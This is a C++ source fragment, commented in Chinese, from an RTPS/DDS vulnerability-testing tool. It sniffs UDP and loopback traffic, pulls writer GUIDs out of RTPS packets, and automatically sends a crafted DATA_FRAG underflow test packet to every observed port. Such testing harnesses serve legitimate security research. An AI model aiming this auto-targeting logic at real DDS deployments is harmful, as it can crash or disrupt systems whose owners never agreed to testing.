{
    if (!udp_listener_running_) {
        return;
    }
    
    std::cout << "停止UDP监听器..." << std::endl;
    
    // 停止监听线程
    udp_listener_running_ = false;
    
    if (udp_listener_thread_.joinable()) {
        udp_listener_thread_.join();
    }
    
    // 关闭所有socket
    for (int sockfd : udp_sockets_) {
        close(sockfd);
    }
    udp_sockets_.clear();
    
    std::cout << "UDP监听器已停止" << std::endl;
}

// UDP监听线程主函数
void TestPuberCore::udpListenerThreadFunction()
{
    std::cout << "UDP监听线程启动" << std::endl;
    
    // 准备poll结构
    std::vector<struct pollfd> poll_fds;
    for (int sockfd : udp_sockets_) {
        struct pollfd pfd;
        pfd.fd = sockfd;
        pfd.events = POLLIN;
        pfd.revents = 0;
        poll_fds.push_back(pfd);
    }
    
    char buffer[65536]; // 最大UDP包大小
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    
    while (udp_listener_running_) {
        // 使用poll等待数据
        int ret = poll(poll_fds.data(), poll_fds.size(), udp_listener_config_.timeout_ms);
        
        if (ret < 0) {
            if (errno == EINTR) {
                continue; // 被信号中断，继续
            }
            std::cout << "poll错误: " << strerror(errno) << std::endl;
            break;
        }
        
        if (ret == 0) {
            // 超时，继续循环
            continue;
        }
        
        // 检查每个socket
        for (size_t i = 0; i < poll_fds.size(); ++i) {
            if (poll_fds[i].revents & POLLIN) {
                // 接收数据
                ssize_t bytes_received = recvfrom(poll_fds[i].fd, buffer, sizeof(buffer), 0,
                                                (struct sockaddr*)&client_addr, &client_addr_len);
                
                if (bytes_received > 0) {
                    std::string source_ip = inet_ntoa(client_addr.sin_addr);
                    int source_port = ntohs(client_addr.sin_port);
                    int local_port = udp_listener_config_.start_port + i;
                    // 覆盖为真实端口
                    struct sockaddr_in local_addr; socklen_t local_len = sizeof(local_addr);
                    if (getsockname(poll_fds[i].fd, (struct sockaddr*)&local_addr, &local_len) == 0) {
                        local_port = ntohs(local_addr.sin_port);
                        // 跳过7400端口的数据包
                        if (local_port == 7400) {
                            continue;
                        }
                        // 记录最近端口
                        last_observed_dst_port_.store(local_port, std::memory_order_relaxed);
                        // 加入端口集合
                        {
                            std::lock_guard<std::mutex> g(observed_ports_mutex_);
                            observed_dst_ports_.insert(local_port);
                        }
                    }
                    
                    // 记录接收到的数据包
                    auto now = std::chrono::system_clock::now();
                    auto time_t = std::chrono::system_clock::to_time_t(now);
                    
                    udp_listener_log_file_ << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
                                          << "从 " << source_ip << ":" << source_port 
                                          << " 接收到 " << bytes_received << " 字节数据，本地端口: " << local_port << std::endl;
                    udp_listener_log_file_.flush();
                    
                    // 尝试解析RTPS数据包
                    DiscoveredWriterInfo writer_info;
                    if (parseRTPSPacket(buffer, bytes_received, source_ip, source_port, writer_info)) {
                        std::lock_guard<std::mutex> lock(discovered_writers_mutex_);
                        
                        // 检查是否已经存在相同的GUID
                        bool guid_exists = false;
                        for (const auto& existing_writer : discovered_writers_) {
                            if (existing_writer.writer_guid == writer_info.writer_guid) {
                                guid_exists = true;
                                break;
                            }
                        }
                        
                        if (!guid_exists) {
                            discovered_writers_.push_back(writer_info);
                            
                            std::cout << "发现新的Writer: " << std::endl;
                            std::cout << "  GUID: " << writer_info.writer_guid << std::endl;
                            std::cout << "  来源: " << source_ip << ":" << source_port << std::endl;
                            std::cout << "  Topic: " << writer_info.topic_name << std::endl;
                            std::cout << "  Type: " << writer_info.type_name << std::endl;
                            
                            // 使用发现的GUID生成测试数据包
                            std::cout << "使用发现的GUID生成DATA_FRAG下溢测试数据包..." << std::endl;
                            try {
                                auto test_packet = generateDataFragUnderflowPacket(discovered_writers_.size(), &writer_info.writer_guid);
                                // 对所有已观察到的端口各发送一包
                                std::set<int> ports_snapshot;
                                {
                                    std::lock_guard<std::mutex> g(observed_ports_mutex_);
                                    ports_snapshot = observed_dst_ports_;
                                }
                                for (int p : ports_snapshot) {
                                    last_observed_dst_port_.store(p, std::memory_order_relaxed);
                                    sendVulnerabilityTestPacket(test_packet, "基于发现GUID的DATA_FRAG下溢测试", discovered_writers_.size());
                                }
                                std::cout << "成功发送基于发现GUID的测试数据包至 " << ports_snapshot.size() << " 个端口" << std::endl;
                            } catch (const std::exception& e) {
                                std::cout << "生成或发送测试数据包时发生异常: " << e.what() << std::endl;
                            }
                        }
                    }
                }
            }
        }
    }
    
    std::cout << "UDP监听线程结束" << std::endl;
}

// 移除pcap实现，仅保留原始套接字版本

// 原始套接字监听线程（无libpcap时回退）
void TestPuberCore::rawListenerThreadFunction()
{
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        std::cout << "创建AF_PACKET套接字失败: " << strerror(errno) << std::endl;
        return;
    }
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        std::cout << "获取lo索引失败: " << strerror(errno) << std::endl;
        close(fd);
        return;
    }
    struct sockaddr_ll sll; memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        std::cout << "绑定AF_PACKET到lo失败: " << strerror(errno) << std::endl;
        close(fd);
        return;
    }

    std::vector<unsigned char> buf(65536);
    while (udp_listener_running_) {
        ssize_t n = recv(fd, buf.data(), buf.size(), 0);
        if (n <= 0) {
            if (errno == EINTR) continue;
            if (!udp_listener_running_) break;
            continue;
        }
        if ((size_t)n < 14 + 20 + 8) continue; // 以太网+IP+UDP最小
        const unsigned char* eth = buf.data();
        uint16_t ethertype = (eth[12] << 8) | eth[13];
        if (ethertype != 0x0800) continue; // 仅IPv4
        const unsigned char* ip = eth + 14;
        if ((ip[0] >> 4) != 4) continue;
        size_t ihl = (ip[0] & 0x0F) * 4;
        if ((size_t)n < 14 + ihl + 8) continue;
        if (ip[9] != 17) continue; // UDP
        const unsigned char* udp = ip + ihl;
        uint16_t dst_port = (udp[2] << 8) | udp[3];
        if (dst_port == 7400) continue;
        if (dst_port < 7401 || dst_port > 7500) continue;
        const char* payload = (const char*)(udp + 8);
        size_t payload_len = n - (payload - (const char*)buf.data());

        last_observed_dst_port_.store(dst_port, std::memory_order_relaxed);
        {
            std::lock_guard<std::mutex> g(observed_ports_mutex_);
            observed_dst_ports_.insert((int)dst_port);
        }

        DiscoveredWriterInfo writer_info;
        if (parseRTPSPacket(payload, payload_len, "127.0.0.1", 0, writer_info)) {
            std::lock_guard<std::mutex> lock(discovered_writers_mutex_);
            bool guid_exists = false;
            for (const auto& existing_writer : discovered_writers_) {
                if (existing_writer.writer_guid == writer_info.writer_guid) { guid_exists = true; break; }
            }
            if (!guid_exists) {
                discovered_writers_.push_back(writer_info);
                auto test_packet = generateDataFragUnderflowPacket(discovered_writers_.size(), &writer_info.writer_guid);
                std::set<int> ports_snapshot;
                {
                    std::lock_guard<std::mutex> g2(observed_ports_mutex_);
                    ports_snapshot = observed_dst_ports_;
                }
                for (int p : ports_snapshot) {
                    last_observed_dst_port_.store(p, std::memory_order_relaxed);
                    sendVulnerabilityTestPacket(test_packet, "(raw) 基于发现GUID的DATA_FRAG下溢测试", discovered_writers_.size());
                }
            }
        }
    }
    close(fd);
}
// 解析RTPS数据包并提取Writer GUID
bool TestPuberCore::parseRTPSPacket(
    const char* packet_data, 
    size_t packet_size,
    const std::string& source_ip,
    int source_port,
    DiscoveredWriterInfo& writer_info)
{
    if (packet_size < 20) {
        return false; // RTPS头部至少20字节
    }
    // //打印packet_data前200个字节
    // for (size_t j = 0; j < std::min(packet_size, size_t(200)); ++j) {
    //     std::cout << std::hex << std::setw(2) << std::setfill('0') 
    //               << static_cast<int>(static_cast<unsigned char>(packet_data[j])) << " ";
    // }
    // std::cout << std::endl;
    // 检查RTPS Magic Header
    if (packet_data[0] != 'R' || packet_data[1] != 'T' || 
        packet_data[2] != 'P' || packet_data[3] != 'S') {
        return false; // 不是RTPS数据包
    }
    
    writer_info.source_ip = source_ip;
    writer_info.source_port = source_port;
    writer_info.discovery_time = std::chrono::system_clock::now();
    
    // 解析GUID前缀 (从字节4开始，跳过Magic Header和Protocol Version)
    // RTPS头部结构: Magic(4) + Version(2) + VendorId(2) + GuidPrefix(12)
    if (packet_size < 20) {
        return false;
    }
    
    // 复制GUID前缀 (12字节)
    memcpy(writer_info.writer_guid.guidPrefix.value, packet_data + 8, 12);
    
    // 解析子消息
    size_t offset = 20; // 跳过RTPS头部
    while (offset < packet_size) {
        if (offset + 4 > packet_size) {
            break; // 没有足够的字节读取子消息头部
        }
        
        uint8_t submessage_id = packet_data[offset];
        uint8_t flags = packet_data[offset + 1];
        uint16_t length = *reinterpret_cast<const uint16_t*>(packet_data + offset + 2);
        
        // 检查长度是否合理
        if (offset + 4 + length > packet_size) {
            break;
        }
        
        // 处理DATA子消息 (ID = 0x15)
        if (submessage_id == 0x15) {
            // DATA子消息结构: ID(1) + Flags(1) + Length(2) + ExtraFlags(2) + 
            //                   OctetsToInlineQos(2) + ReaderId(4) + WriterId(4) + ...
            if (length >= 12) {
                // 提取Writer Entity ID (4字节)
                memcpy(writer_info.writer_guid.entityId.value, packet_data + offset + 10, 4);
                std::cout << std::endl;
                // 尝试从后续数据中提取Topic和Type信息
                // 这里简化处理，实际可能需要更复杂的解析
                writer_info.topic_name = "Unknown";
                writer_info.type_name = "Unknown";
                
                return true;
            }
        }
        
        // 移动到下一个子消息
        offset += 4 + length;
    }
    
    return false;
}

// 获取发现的Writer列表
std::vector<TestPuberCore::DiscoveredWriterInfo> TestPuberCore::getDiscoveredWriters()
{
    std::lock_guard<std::mutex> lock(discovered_writers_mutex_);
    return discovered_writers_;
}

// 打印发现的Writer信息
void TestPuberCore::printDiscoveredWriters() const
{
    std::lock_guard<std::mutex> lock(discovered_writers_mutex_);
    
    std::cout << "\n=== 发现的Writer信息 ===" << std::endl;
    std::cout << "总共发现 " << discovered_writers_.size() << " 个Writer" << std::endl;
    
    for (size_t i = 0; i < discovered_writers_.size(); ++i) {
        const auto& writer = discovered_writers_[i];
        auto time_t = std::chrono::system_clock::to_time_t(writer.discovery_time);
        
        std::cout << "\nWriter #" << (i + 1) << ":" << std::endl;
        std::cout << "  GUID: " << writer.writer_guid << std::endl;
        std::cout << "  来源: " << writer.source_ip << ":" << writer.source_port << std::endl;
        std::cout << "  Topic: " << writer.topic_name << std::endl;
        std::cout << "  Type: " << writer.type_name << std::endl;
        std::cout << "  发现时间: " << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << std::endl;
    }
}